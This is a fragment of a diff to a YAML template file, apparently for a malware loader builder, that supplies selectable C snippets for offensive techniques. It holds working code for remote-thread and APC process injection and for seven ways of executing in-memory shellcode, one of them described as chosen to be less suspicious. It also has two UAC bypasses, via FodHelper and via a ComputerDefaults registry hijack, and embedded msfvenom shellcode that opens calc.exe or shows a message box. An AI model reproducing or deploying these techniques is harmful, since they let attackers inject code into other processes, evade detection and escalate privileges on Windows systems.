+                      WriteFile(hFile, data, (DWORD)strlen(data), &written, NULL);
+                      CloseHandle(hFile);
+                  }
+              }
+          }
+
+  # --------------------------------------------------------------------------
+  # PROCESS INJECTION TECHNIQUES
+  # --------------------------------------------------------------------------
   - header: "Process Injection"
     template: "psinjection"
     display: "Process Injection"
@@ -109,124 +975,387 @@ sections:
         required: true
         defaultValue: "notepad.exe"
     items:
-      - id: "MpfProcessInjectionViaProcessReflection"
-        display: "MpfProcessInjectionViaProcessReflection"
+      - id: "None"
+        display: "None (Skip)"
         default: true
         snippet: |
-          if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L"$psname$", true))) return 1;
+          // No process injection
 
+      - id: "MpfProcessInjectionViaProcessReflection"
+        display: "Process Reflection Injection"
+        default: false
+        snippet: |
+          if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob, code_blob_len, GetProcessOrThreadId(L"$psname$", true))) return 1;
+
+      - id: "ClassicRemoteThread"
+        display: "Classic Remote Thread Injection"
+        default: false
+        snippet: |
+          // Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+          {
+              HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+              if (hSnap != INVALID_HANDLE_VALUE) {
+                  PROCESSENTRY32W pe32 = {sizeof(pe32)};
+                  DWORD targetPid = 0;
+                  if (Process32FirstW(hSnap, &pe32)) {
+                      do {
+                          if (_wcsicmp(pe32.szExeFile, L"$psname$") == 0) {
+                              targetPid = pe32.th32ProcessID;
+                              break;
+                          }
+                      } while (Process32NextW(hSnap, &pe32));
+                  }
+                  CloseHandle(hSnap);
+                  
+                  if (targetPid) {
+                      HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+                      if (hProc) {
+                          LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                          if (remoteMem) {
+                              SIZE_T written;
+                              if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {
+                                  HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
+                                  if (hThread) {
+                                      WaitForSingleObject(hThread, INFINITE);
+                                      CloseHandle(hThread);
+                                  }
+                              }
+                          }
+                          CloseHandle(hProc);
+                      }
+                  }
+              }
+          }
+
+      - id: "QueueUserAPC"
+        display: "QueueUserAPC Injection"
+        default: false
+        snippet: |
+          // QueueUserAPC injection into target process
+          {
+              HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
+              if (hSnap != INVALID_HANDLE_VALUE) {
+                  PROCESSENTRY32W pe32 = {sizeof(pe32)};
+                  DWORD targetPid = 0;
+                  if (Process32FirstW(hSnap, &pe32)) {
+                      do {
+                          if (_wcsicmp(pe32.szExeFile, L"$psname$") == 0) {
+                              targetPid = pe32.th32ProcessID;
+                              break;
+                          }
+                      } while (Process32NextW(hSnap, &pe32));
+                  }
+                  
+                  if (targetPid) {
+                      HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+                      if (hProc) {
+                          LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                          if (remoteMem) {
+                              SIZE_T written;
+                              if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {
+                                  THREADENTRY32 te32 = {sizeof(te32)};
+                                  if (Thread32First(hSnap, &te32)) {
+                                      do {
+                                          if (te32.th32OwnerProcessID == targetPid) {
+                                              HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+                                              if (hThread) {
+                                                  QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);
+                                                  CloseHandle(hThread);
+                                              }
+                                          }
+                                      } while (Thread32Next(hSnap, &te32));
+                                  }
+                              }
+                          }
+                          CloseHandle(hProc);
+                      }
+                  }
+                  CloseHandle(hSnap);
+              }
+          }
+
+  # --------------------------------------------------------------------------
+  # SHELLCODE EXECUTION METHODS
+  # --------------------------------------------------------------------------
   - header: "Shellcode Execution"
     template: "shellcodeexecution"
     display: "Shellcode Execution"
     allowMultiple: false
     items:
-      - id: "PayloadExecViaFuncPtr"
-        display: "Payload Execution Via Function Pointer"
+      - id: "VirtualAllocExec"
+        display: "VirtualAlloc + Function Pointer"
         default: true
         snippet: |
-              void* executableMemory = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-              if (executableMemory == NULL) {
-                  return -1;
-              }
-
-              memcpy(executableMemory, code_blob, code_blob_len);
-
-              DWORD oldProtect;
-              if (!VirtualProtect(executableMemory, code_blob_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-                  return -1;
-              }
-
-              ((void(*)()) executableMemory)();
-
-              VirtualFree(executableMemory, 0, MEM_RELEASE);
-
-
-
-  - header: "Generic Payload"
-    template: "genericshellcode"
-    display: "Generic Payload"
-    allowMultiple: false
-    items:
-      - id: "GenericShellcodeOpenCalcExitThread"
-        display: "GenericShellcodeOpenCalcExitThread"
-        default: true
-        snippet: |
-          //msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f c -a x64
-          //Length = 277
-          
-          UCHAR RawPayloadBuffer[] =
-          	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-          	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-          	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-          	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-          	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-          	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-          	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-          	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-          	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-          	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-          	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-          	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-          	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-          	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-          	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
-          	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
-          	"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
-          	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
-          	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-          	"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
-          
-          DWORD RawBufferSize = 277;
-          PCHAR Payload;
-          
-          Payload = (PCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, RawBufferSize);
-          if (Payload == NULL)
-          	return NULL;
-          
-          CopyMemory(Payload, RawPayloadBuffer, RawBufferSize);
-          
-          *SizeOfShellcodeInBytes = RawBufferSize;
-          
-          return Payload;
-
-  - header: "Guardrails"
-    template: "guardrail"
-    display: "Guardrails (env vars)"
-    allowMultiple: false
-    inputs:
-      - id: "guardrailParamTextBox"
-        type: "textbox"
-        label: "Guardrail parameter"
-        placement: "before"
-        width: 240
-        required: true
-        defaultValue: "PROCESSOR_LEVEL#equals#6"
-        infoAction: "GuardRailInfo"
-        infoButtonLabel: "Info"
-    items:
-      - id: "RequireEnvironmentVariable"
-        display: "Require Environment Variable"
-        default: true
-        snippet: |
-          if (GetEnvironmentVariableW(L"__GUARDRAIL_PARAM__", nullptr, 0) == 0)
+          // Execute via VirtualAlloc + function pointer
           {
-              return 0;
+              void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+              if (execMem == NULL) return -1;
+              
+              memcpy(execMem, code_blob, code_blob_len);
+              
+              DWORD oldProtect;
+              if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
+                  VirtualFree(execMem, 0, MEM_RELEASE);
+                  return -1;
+              }
+              
+              ((void(*)())execMem)();
+              
+              VirtualFree(execMem, 0, MEM_RELEASE);
           }
 
+      - id: "HeapExec"
+        display: "HeapAlloc + VirtualProtect"
+        default: false
+        snippet: |
+          // Execute via HeapAlloc (less suspicious than VirtualAlloc)
+          {
+              HANDLE hHeap = GetProcessHeap();
+              void* execMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, code_blob_len);
+              if (execMem == NULL) return -1;
+              
+              memcpy(execMem, code_blob, code_blob_len);
+              
+              DWORD oldProtect;
+              if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
+                  HeapFree(hHeap, 0, execMem);
+                  return -1;
+              }
+              
+              ((void(*)())execMem)();
+              
+              VirtualProtect(execMem, code_blob_len, oldProtect, &oldProtect);
+              HeapFree(hHeap, 0, execMem);
+          }
+
+      - id: "CreateThread"
+        display: "CreateThread Execution"
+        default: false
+        snippet: |
+          // Execute via CreateThread
+          {
+              void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+              if (execMem == NULL) return -1;
+              
+              memcpy(execMem, code_blob, code_blob_len);
+              
+              DWORD oldProtect;
+              VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+              
+              HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
+              if (hThread) {
+                  WaitForSingleObject(hThread, INFINITE);
+                  CloseHandle(hThread);
+              }
+              
+              VirtualFree(execMem, 0, MEM_RELEASE);
+          }
+
+      - id: "NtCreateThreadEx"
+        display: "NtCreateThreadEx (Direct Syscall)"
+        default: false
+        snippet: |
+          // Execute via NtCreateThreadEx
+          {
+              typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+              
+              void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+              if (execMem == NULL) return -1;
+              
+              memcpy(execMem, code_blob, code_blob_len);
+              
+              DWORD oldProtect;
+              VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+              
+              HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+              if (ntdll) {
+                  pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+                  if (NtCreateThreadEx) {
+                      HANDLE hThread = NULL;
+                      NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), 
+                                                         execMem, NULL, 0, 0, 0, 0, NULL);
+                      if (hThread) {
+                          WaitForSingleObject(hThread, INFINITE);
+                          CloseHandle(hThread);
+                      }
+                  }
+              }
+              
+              VirtualFree(execMem, 0, MEM_RELEASE);
+          }
+
+      - id: "FiberExec"
+        display: "Fiber Execution"
+        default: false
+        snippet: |
+          // Execute via Fibers
+          {
+              void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+              if (execMem == NULL) return -1;
+              
+              memcpy(execMem, code_blob, code_blob_len);
+              
+              DWORD oldProtect;
+              VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+              
+              PVOID mainFiber = ConvertThreadToFiber(NULL);
+              if (mainFiber) {
+                  PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
+                  if (shellcodeFiber) {
+                      SwitchToFiber(shellcodeFiber);
+                      DeleteFiber(shellcodeFiber);
+                  }
+                  ConvertFiberToThread();
+              }
+              
+              VirtualFree(execMem, 0, MEM_RELEASE);
+          }
+
+      - id: "CallbackExec"
+        display: "Callback Function Execution"
+        default: false
+        snippet: |
+          // Execute via callback function (EnumWindows)
+          {
+              void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+              if (execMem == NULL) return -1;
+              
+              memcpy(execMem, code_blob, code_blob_len);
+              
+              DWORD oldProtect;
+              VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+              
+              EnumWindows((WNDENUMPROC)execMem, 0);
+              
+              VirtualFree(execMem, 0, MEM_RELEASE);
+          }
+
+      - id: "ThreadPoolExec"
+        display: "Thread Pool Execution"
+        default: false
+        snippet: |
+          // Execute via Windows Thread Pool
+          {
+              void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+              if (execMem == NULL) return -1;
+              
+              memcpy(execMem, code_blob, code_blob_len);
+              
+              DWORD oldProtect;
+              VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+              
+              PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)execMem, NULL, NULL);
+              if (work) {
+                  SubmitThreadpoolWork(work);
+                  WaitForThreadpoolWorkCallbacks(work, FALSE);
+                  CloseThreadpoolWork(work);
+              }
+              
+              VirtualFree(execMem, 0, MEM_RELEASE);
+          }
+
+  # --------------------------------------------------------------------------
+  # UAC BYPASS TECHNIQUES
+  # --------------------------------------------------------------------------
   - header: "UAC Bypass"
     template: "uacb"
     display: "UAC Bypass"
     allowMultiple: false
     items:
-      - id: "UacBypassFodHelperMethodA"
-        display: "UacBypassFodHelperMethodA"
+      - id: "None"
+        display: "None (Skip)"
         default: true
         snippet: |
-          PROCESS_INFORMATION pi{};
-          if (UacBypassFodHelperMethodA("C:\\Windows\\System32\\cmd.exe", &pi))
+          // No UAC bypass
+
+      - id: "FodHelper"
+        display: "FodHelper Method"
+        default: false
+        snippet: |
+          // UAC Bypass via FodHelper
           {
-              CloseHandle(pi.hThread);
-              CloseHandle(pi.hProcess);
-              return 1;
+              PROCESS_INFORMATION pi = {0};
+              if (UacBypassFodHelperMethodA("C:\\Windows\\System32\\cmd.exe", &pi)) {
+                  WaitForSingleObject(pi.hProcess, INFINITE);
+                  CloseHandle(pi.hThread);
+                  CloseHandle(pi.hProcess);
+              }
           }
+
+      - id: "ComputerDefaults"
+        display: "ComputerDefaults Method"
+        default: false
+        snippet: |
+          // UAC Bypass via ComputerDefaults
+          {
+              HKEY hKey;
+              if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 
+                                  0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+                  const wchar_t* cmd = L"cmd.exe";
+                  RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)));
+                  RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
+                  RegCloseKey(hKey);
+                  
+                  ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_HIDE);
+                  Sleep(3000);
+                  
+                  RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
+              }
+          }
+
+  # --------------------------------------------------------------------------
+  # GENERIC PAYLOAD (for testing)
+  # --------------------------------------------------------------------------
+  - header: "Generic Payload"
+    template: "genericshellcode"
+    display: "Generic Payload"
+    allowMultiple: false
+    items:
+      - id: "CalcShellcode"
+        display: "Calculator Shellcode (x64)"
+        default: true
+        snippet: |
+          // msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f c -a x64
+          unsigned char code_blob[] =
+              "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+              "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+              "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+              "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+              "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+              "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+              "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+              "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+              "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+              "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+              "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+              "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+              "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+              "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+              "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+              "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+              "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+              "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+              "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+              "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+          unsigned int code_blob_len = 277;
+
+      - id: "MessageBoxShellcode"
+        display: "MessageBox Shellcode (x64)"
+        default: false
+        snippet: |
+          // Simple MessageBox shellcode for testing
+          unsigned char code_blob[] =
+              "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00"
+              "\x00\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C"
+              "\x8B\xF8\x48\x8D\x0D\x5D\x00\x00\x00\xE8\x8F\x00\x00\x00"
+              "\x48\x8B\xC8\x4D\x33\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48"
+              "\x8D\x15\x54\x00\x00\x00\x48\xFF\xD0\x48\x8D\x15\x6F\x00"
+              "\x00\x00\x48\x8D\x0D\x63\x00\x00\x00\xE8\x63\x00\x00\x00"
+              "\x4C\x8B\xF8\x48\x8D\x0D\x68\x00\x00\x00\xE8\x54\x00\x00"
+              "\x00\x48\x8B\xC8\x48\x33\xD2\x48\xFF\xD0\x00\x6B\x65\x72"
+              "\x6E\x65\x6C\x33\x32\x2E\x64\x6C\x6C\x00\x75\x73\x65\x72"
+              "\x33\x32\x2E\x64\x6C\x6C\x00\x4D\x65\x73\x73\x61\x67\x65"
+              "\x42\x6F\x78\x41\x00\x48\x65\x6C\x6C\x6F\x00\x57\x6F\x72"
+              "\x6C\x64\x00\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73"
+              "\x00";
+          unsigned int code_blob_len = 162;
